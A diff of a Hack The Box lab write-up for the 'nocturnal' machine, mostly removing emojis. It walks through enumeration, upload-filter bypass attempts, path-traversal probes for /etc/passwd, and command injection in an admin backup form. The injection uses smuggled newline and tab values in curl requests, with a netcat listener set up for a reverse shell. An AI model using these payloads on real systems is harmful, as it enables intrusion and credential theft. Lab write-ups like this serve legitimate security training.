@@ -1,26 +1,26 @@
-# 🔍 Hack The Box - `nocturnal.htb` Writeup  
+# Hack The Box - `nocturnal.htb` Writeup  
 **Difficulty**: Medium  
 **IP Address**: `10.129.232.23`  
 **Hostname**: `nocturnal.htb`  
-**Author**: Your relentless enumeration 😤💪  
+**Author**: Your relentless enumeration   
 
 ---
 
-## 🌐 Initial Recon - Nmap All The Things!
+## Initial Recon - Nmap All The Things!
 
 ```bash
 nmap -sC -sV -oN nmap/initial 10.129.232.23
 ```
 
 **Results:**
-```
+```text
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
 80/tcp open  http    nginx 1.18.0 Ubuntu
 ```
 
-⏩ Port 80 auto-redirects to `http://nocturnal.htb/`  
-🧠 Add to `/etc/hosts`:
+ Port 80 auto-redirects to `http://nocturnal.htb/`  
+ Add to `/etc/hosts`:
 
 ```bash
 echo "10.129.232.23 nocturnal.htb" | sudo tee -a /etc/hosts
@@ -28,28 +28,28 @@ echo "10.129.232.23 nocturnal.htb" | sudo tee -a /etc/hosts
 
 ---
 
-## 🕸️ Web Enumeration - Portal Discovery!
+## Web Enumeration - Portal Discovery!
 
 Browsing to `http://nocturnal.htb/` gives us a **file upload login portal**.
 
-🪪 Login discovered via guesswork:
+ Login discovered via guesswork:
 
 ```text
 Username: user
 Password: user
 ```
 
-✅ Successful login reveals an upload form.
+ Successful login reveals an upload form.
 
-📝 After upload, files are available at:
+ After upload, files are available at:
 
-```
+```text
 http://nocturnal.htb/view.php?username=user&file=<filename>
 ```
 
 ---
 
-## 📂 File Upload Analysis - Let the Shell Games Begin!
+## File Upload Analysis - Let the Shell Games Begin!
 
 Allowed extensions (as per error message):
 
@@ -57,17 +57,17 @@ Allowed extensions (as per error message):
 Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.
 ```
 
-### 🔥 Attempted Payloads
+### Attempted Payloads
 
 | Payload                        | Result                                              |
 |-------------------------------|-----------------------------------------------------|
-| `shell.php.doc`               | Upload successful, but no execution 😤              |
+| `shell.php.doc`               | Upload successful, but no execution               |
 | `shell.php%00.doc`            | Server responds, but no null byte behavior observed |
 | `?file=shell.php.doc`         | File shown as plain text – PHP not parsed           |
 | `?file=shell.doc`             | Same result                                         |
 | `?file=shell.php%250.doc`     | No execution, `%250` ineffective                    |
 
-### 🔬 Theory:
+### Theory:
 
 - PHP is **not parsed**, likely due to Nginx config treating uploads as static files.
 - `view.php` appears to **read** and **stream** files, not include/execute.
@@ -75,39 +75,39 @@ Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.
 
 ---
 
-## 📁 Directory Enumeration - Hidden Paths Discovered!
+## Directory Enumeration - Hidden Paths Discovered!
 
-### 🔎 Directory Brute-force with FFUF:
+### Directory Brute-force with FFUF:
 
 ```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://nocturnal.htb/FUZZ" -r
 ```
 
-🧾 Notable Results:
+ Notable Results:
 
-```
+```text
 uploads     [Status: 403]
 uploads2    [Status: 403]
 backups     [Status: 403]
 ```
 
-🔐 Forbidden — confirms those dirs **exist** but are protected by Nginx or file perms.
+ Forbidden — confirms those dirs **exist** but are protected by Nginx or file perms.
 
 ---
 
-## 🌐 Subdomain Fuzzing - Expanding the Surface
+## Subdomain Fuzzing - Expanding the Surface
 
 ```bash
 wfuzz -c -w subdomains.txt -u 'http://nocturnal.htb/' -H "Host: FUZZ.nocturnal.htb" --hw 10
 ```
 
-⚠️ No valid subdomains returned — all 200 responses were default page sizes.
+ No valid subdomains returned — all 200 responses were default page sizes.
 
 ---
 
-## 🧩 Current Summary
+## Current Summary
 
-### ✅ Confirmed:
+### Confirmed:
 - Uploads are saved to a user-specific directory
 - Uploads are accessible via `view.php` but only rendered/downloaded — **not executed**
 - Extensions restricted to doc-like types (`.pdf`, `.doc`, etc.)
@@ -115,7 +115,7 @@ wfuzz -c -w subdomains.txt -u 'http://nocturnal.htb/' -H "Host: FUZZ.nocturnal.h
 - No working RCE or LFI behavior yet
 - Subdomain fuzzing yielded no results
 
-### ❌ Tried and Failed:
+### Tried and Failed:
 - `shell.php.doc` → no execution
 - Double extensions, null byte injection, `%250` tricks
 - Subdomain brute-forcing
@@ -123,7 +123,7 @@ wfuzz -c -w subdomains.txt -u 'http://nocturnal.htb/' -H "Host: FUZZ.nocturnal.h
 
 ---
 
-## 🧠 Hypothesis Going Forward
+## Hypothesis Going Forward
 
 ### Potential Exploit Vectors to Investigate:
 
@@ -133,11 +133,11 @@ wfuzz -c -w subdomains.txt -u 'http://nocturnal.htb/' -H "Host: FUZZ.nocturnal.h
 
 2. **SSRF / LFI via `view.php`**
    - Try accessing internal resources via:
-     ```http
+```http
      /view.php?username=user&file=../../../../../../etc/passwd
      /view.php?username=admin&file=secret.txt
      /view.php?username=../uploads2&file=shell.doc
-     ```
+```
    - Maybe `view.php` has weak path sanitization.
 
 3. **File Overwrite**
@@ -153,11 +153,11 @@ wfuzz -c -w subdomains.txt -u 'http://nocturnal.htb/' -H "Host: FUZZ.nocturnal.h
 
 ---
 
-## 🔚 Final Thoughts (for now)
+## Final Thoughts (for now)
 
 You've fully mapped the front door — login, upload, directory structure. The next step is **deeper exploitation via document payloads**, LFI edge cases, or back-end parser triggers. This box is taunting you with a classic **"uploads, but no execution"** trap!
 
-## 🕵️‍♂️ Username Discovery via FFUF - Let's Fuzz 'em Out!
+## Username Discovery via FFUF - Let's Fuzz 'em Out!
 
 We tried to find other valid `username=` values using FFUF with a large wordlist:
 
@@ -169,9 +169,9 @@ ffuf \
   -fc 403 -t 50 -ac -c
 ```
 
-🎯 **Hits Found!**
+ **Hits Found!**
 
-```
+```text
 admin                   [Status: 200]
 amanda                  [Status: 200]
 tobias                  [Status: 200]
@@ -182,7 +182,7 @@ We now know these usernames have file directories and can be queried with `view.
 
 ---
 
-## 📁 Dump Amanda’s Uploads - The Juicy Bits Appear!
+## Dump Amanda’s uploads — notable files
 
 We attempted to fetch a non-existent file from Amanda's space to trigger a file list leak:
 
@@ -190,12 +190,12 @@ We attempted to fetch a non-existent file from Amanda's space to trigger a file 
 curl -s 'http://nocturnal.htb/view.php?username=amanda&file=nonexist.odt'
 ```
 
-🎯 **Success! File listing returned.**  
+ **Success! File listing returned.**  
 We fuzzed or manually tested each discovered filename and downloaded files, eventually retrieving a document (likely `.odt`) containing Amanda's **password**.
 
 ---
 
-## 🔐 Admin Login - The Gate Opens!
+## Admin Login - The Gate Opens!
 
 Login to the admin panel using Amanda’s credentials:
 
@@ -204,16 +204,16 @@ Username: amanda
 Password: [extracted from downloaded file]
 ```
 
-🎉 Admin panel unlocked!  
+ Admin panel unlocked!  
 Navigate to `admin.php` — it includes a form to generate backups. This form accepts a `password` field and a `backup` button.
 
 ---
 
-## 🧨 Command Injection in Password Field!
+## Command Injection in Password Field!
 
 We discovered that the `password` field is directly passed into a shell command behind the scenes. This is likely a classic command injection vulnerability.
 
-### 🔬 Initial Test Payload:
+### Initial Test Payload:
 
 Try a simple test to confirm code execution:
 
@@ -225,22 +225,22 @@ curl -X POST "http://nocturnal.htb/admin.php?view=dashboard.php" \
   --data "backup="
 ```
 
-✅ Command executed — response included file listing output!
+ Command executed — response included file listing output!
 
 ---
 
-## 🐚 Let's Try a Reverse Shell Payload!
+## Let's Try a Reverse Shell Payload!
 
 Target IP: `10.10.14.44`  
 Listener Port: `4444`
 
-### 🔉 Set up a Netcat listener:
+### Set up a Netcat listener:
 
 ```bash
 nc -lvnp 4444
 ```
 
-### 📡 Inject Reverse Shell via URL-encoded Payload:
+### Inject Reverse Shell via URL-encoded Payload:
 
 ```bash
 curl -X POST "http://nocturnal.htb/admin.php?view=dashboard.php" \
@@ -250,7 +250,7 @@ curl -X POST "http://nocturnal.htb/admin.php?view=dashboard.php" \
   --data "backup="
 ```
 
-```bash 
+```bash
  curl -X POST "http://nocturnal.htb/admin.php?view=dashboard.php"   -H "Cookie: PHPSESSID=pr4mhlgg8d9nk2v2cnn6kro302"   -H "Content-Type: application/x-www-form-urlencoded"   --data-urlencode $'password=\nbash\t-c\t"ls"\n'   --data "backup="      
 ```
 
@@ -266,19 +266,19 @@ Each one is a variation of a **bash reverse shell** using either newline/tab cha
 
 ---
 
-## ⏳ Status
+## Status
 
-- ✅ Verified command injection via `password` field
-- ✅ Remote shell possible — pending correct payload execution
-- 🧪 Trying different shell syntax variants to bypass filters and get execution
+-  Verified command injection via `password` field
+-  Remote shell possible — pending correct payload execution
+-  Trying different shell syntax variants to bypass filters and get execution
 
 ---
 
-## 🔭 Next Steps
+## Next Steps
 
-- 🔁 Keep testing reverse shell syntax
-- 💡 Try alternative shells (`sh`, `nc`, `python`)
-- 📉 Use `tcpdump` or Wireshark to confirm connection attempts if shell doesn’t return
-- 👀 Review downloaded `admin.php` (from backup) to analyze sanitization logic
+-  Keep testing reverse shell syntax
+-  Try alternative shells (`sh`, `nc`, `python`)
+-  Use `tcpdump` or Wireshark to confirm connection attempts if shell doesn’t return
+-  Review downloaded `admin.php` (from backup) to analyze sanitization logic
 
-Stay tuned — we're *so close* to shellfire! 🔥🐚
+Continue with the remaining enumeration or shell steps as documented below.
